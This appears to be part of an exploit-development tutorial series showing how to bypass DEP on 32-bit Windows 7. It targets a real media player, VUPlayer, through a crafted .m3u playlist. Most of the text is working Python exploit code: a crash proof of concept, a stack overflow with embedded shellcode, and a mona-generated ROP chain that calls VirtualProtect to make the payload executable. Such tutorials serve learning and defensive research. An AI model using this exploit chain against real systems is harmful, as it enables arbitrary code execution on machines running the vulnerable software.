# Part3ï¼š Bypass DEP with ROP

## Get things setup
1. Win7 X86
2. [vulnerable software](https://www.exploit-db.com/apps/39adeb7fa4711cd1cac8702fb163ded5-vuplayersetup.exe)
3. Enable DEP(need to restart computer)
![](Part3-ROP/Part3-ROP0.png)

## Crash POC
```
import struct

buf_size = 3000

buf = 'A' * buf_size


print "[+] Creating .m3u file of size "+ str(len(buf))
 
file = open('vuplayer-dep.m3u','w');
file.write(buf);
file.close();
 
print "[+] Done creating the file"
```

![](Part3-ROP/Part3-ROP1.png)

## Data Execution Prevention
Use mona to customize our exploit.

```
> !py mona pattern_offset
> !py jmp -r esp
```

```
import struct

buf_size = 3000


junk = "A"*1012
eip = struct.pack("<L", 0x100222c5)

nops = "\x90" * 24
shellcode = "\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"
shellcode += "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
shellcode += "\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"
shellcode += "\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"
shellcode += "\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"
shellcode += "\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"
shellcode += "\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
shellcode += "\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"
shellcode += "\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"
shellcode += "\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
shellcode += "\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"
shellcode += "\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"
shellcode += "\x8E\x03\xD3\x52\x33\xFF\x57\x68\x61\x72"
shellcode += "\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F"
shellcode += "\x61\x64\x54\x53\xFF\xD2\x68\x33\x32\x01"
shellcode += "\x01\x66\x89\x7C\x24\x02\x68\x75\x73\x65"
shellcode += "\x72\x54\xFF\xD0\x68\x6F\x78\x41\x01\x8B"
shellcode += "\xDF\x88\x5C\x24\x03\x68\x61\x67\x65\x42"
shellcode += "\x68\x4D\x65\x73\x73\x54\x50\xFF\x54\x24"
shellcode += "\x2C\x57\x68\x4F\x5F\x6F\x21\x8B\xDC\x57"
shellcode += "\x53\x53\x57\xFF\xD0\x68\x65\x73\x73\x01"
shellcode += "\x8B\xDF\x88\x5C\x24\x03\x68\x50\x72\x6F"
shellcode += "\x63\x68\x45\x78\x69\x74\x54\xFF\x74\x24"
shellcode += "\x40\xFF\x54\x24\x40\x57\xFF\xD0";


exploit = junk + eip + nops + shellcode
fill = "\x43" * (buf_size - len(exploit))
buf = exploit + fill


 
print "[+] Creating .m3u file of size "+ str(len(buf))
 
file = open('vuplayer-dep.m3u','w');
file.write(buf);
file.close();
 
print "[+] Done creating the file"
```

![](Part3-ROP/Part3-ROP2.png)

## Make shellcode area executable
Here we are using [VirtualProtect function](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualprotect) to change the memory protection option of the calling process. 

```
BOOL VirtualProtect(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flNewProtect,
  PDWORD lpflOldProtect
);
```

What we're going to do is collect a bunch of existing assembly instructions that aren't marked as non-executable by DEP and chain them to call VirtualProtect to make the shellcode executable. Let's use mona to help us! 

```
we don't like '\x00' in our exploit
> mona.py rop -cpb '\x00'
```

```
def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x1001d892,  # POP EBP # RETN [BASS.dll] 
      0x1001d892,  # skip 4 bytes [BASS.dll]
      0x10015f77,  # POP EAX # RETN [BASS.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x10014db4,  # NEG EAX # RETN [BASS.dll] 
      0x10032f32,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll] 
      0x10015f82,  # POP EAX # RETN [BASS.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x10014db4,  # NEG EAX # RETN [BASS.dll] 
      0x10038a6c,  # XCHG EAX,EDX # RETN [BASS.dll] 
      0x106040c0,  # POP ECX # RETN [BASSMIDI.dll] 
      0x1010892e,  # &Writable location [BASSWMA.dll]
      0x10603658,  # POP EDI # RETN [BASSMIDI.dll] 
      0x1001dc05,  # RETN (ROP NOP) [BASS.dll]
      0x10606b61,  # POP ESI # RETN [BASSMIDI.dll] 
      0x100177e4,  # JMP [EAX] [BASS.dll]
      0x10015f82,  # POP EAX # RETN [BASS.dll] 
      0x10040284,  # ptr to &VirtualProtect() [IAT BASS.dll]
      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
      0x100222c5,  # ptr to 'jmp esp' [BASS.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
```


In Part1-StackOverflow, we want progress jump to esp, so we put a pointer that point to "jmp esp" into eip.

For now, we want progress jump to [esp], so we put a pointer that point to "RETN" into eip.
```
import struct

buf_size = 3000

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x1001d892,  # POP EBP # RETN [BASS.dll] 
      0x1001d892,  # skip 4 bytes [BASS.dll]
      0x10015f77,  # POP EAX # RETN [BASS.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x10014db4,  # NEG EAX # RETN [BASS.dll] 
      0x10032f32,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll] 
      0x10015f82,  # POP EAX # RETN [BASS.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x10014db4,  # NEG EAX # RETN [BASS.dll] 
      0x10038a6c,  # XCHG EAX,EDX # RETN [BASS.dll] 
      0x106040c0,  # POP ECX # RETN [BASSMIDI.dll] 
      0x1010892e,  # &Writable location [BASSWMA.dll]
      0x10603658,  # POP EDI # RETN [BASSMIDI.dll] 
      0x1001dc05,  # RETN (ROP NOP) [BASS.dll]
      0x10606b61,  # POP ESI # RETN [BASSMIDI.dll] 
      0x100177e4,  # JMP [EAX] [BASS.dll]
      0x10015f82,  # POP EAX # RETN [BASS.dll] 
      0x10040284,  # ptr to &VirtualProtect() [IAT BASS.dll]
      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
      0x100222c5,  # ptr to 'jmp esp' [BASS.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)


junk = "A"*1012
eip = struct.pack("<L", 0x1001d893)  #ptr to 'RETN' in BASS.dll

rop_chain = create_rop_chain()
nops = "\x90" * 24
shellcode = "\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"
shellcode += "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
shellcode += "\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"
shellcode += "\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"
shellcode += "\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"
shellcode += "\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"
shellcode += "\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
shellcode += "\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"
shellcode += "\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"
shellcode += "\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
shellcode += "\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"
shellcode += "\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"
shellcode += "\x8E\x03\xD3\x52\x33\xFF\x57\x68\x61\x72"
shellcode += "\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F"
shellcode += "\x61\x64\x54\x53\xFF\xD2\x68\x33\x32\x01"
shellcode += "\x01\x66\x89\x7C\x24\x02\x68\x75\x73\x65"
shellcode += "\x72\x54\xFF\xD0\x68\x6F\x78\x41\x01\x8B"
shellcode += "\xDF\x88\x5C\x24\x03\x68\x61\x67\x65\x42"
shellcode += "\x68\x4D\x65\x73\x73\x54\x50\xFF\x54\x24"
shellcode += "\x2C\x57\x68\x4F\x5F\x6F\x21\x8B\xDC\x57"
shellcode += "\x53\x53\x57\xFF\xD0\x68\x65\x73\x73\x01"
shellcode += "\x8B\xDF\x88\x5C\x24\x03\x68\x50\x72\x6F"
shellcode += "\x63\x68\x45\x78\x69\x74\x54\xFF\x74\x24"
shellcode += "\x40\xFF\x54\x24\x40\x57\xFF\xD0";


exploit = junk + eip  + rop_chain + nops + shellcode
fill = "\x43" * (buf_size - len(exploit))
buf = exploit + fill

 
print "[+] Creating .m3u file of size "+ str(len(buf))
 
file = open('vuplayer-dep.m3u','w');
file.write(buf);
file.close();
 
print "[+] Done creating the file"
```

Exploit Success!

![](Part3-ROP/Part3-ROP3.png)